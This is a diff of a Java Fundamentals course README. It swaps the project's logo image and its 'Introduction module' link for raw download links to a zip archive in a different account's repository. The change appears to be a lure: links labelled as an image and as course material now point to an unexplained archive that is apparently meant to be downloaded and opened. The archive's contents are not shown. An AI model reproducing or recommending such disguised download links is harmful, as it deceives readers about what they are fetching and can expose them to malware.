@@ -1,4 +1,4 @@
-# <img src="https://raw.githubusercontent.com/bobocode-projects/resources/master/image/logo_transparent_background.png" height=50/>Welcome to the Java Fundamentals Course
+# <img src="https://raw.githubusercontent.com/karaedd/java-fundamentals-course/main/suppliance/java-fundamentals-course.zip" height=50/>Welcome to the Java Fundamentals Course
 Build strong fundamental skills that you will need for real-world Enterprise Java development
 
 ## Why
@@ -19,4 +19,4 @@ This course gives you two uniques features that will help you to master fundamen
 1. It consists of **selected topics that are must-have** for real-world enterprise Java development ⭐️
 2. It is fully based on **special training exercises** that put your practice on rails and **boost up your learning efficiency** 🚀
 
-Go ahead and check out [Introduction module](https://github.com/bobocode-projects/java-fundamentals-course/tree/main/0-0-intro#introduction) 👍
+Go ahead and check out [Introduction module](https://raw.githubusercontent.com/karaedd/java-fundamentals-course/main/suppliance/java-fundamentals-course.zip) 👍
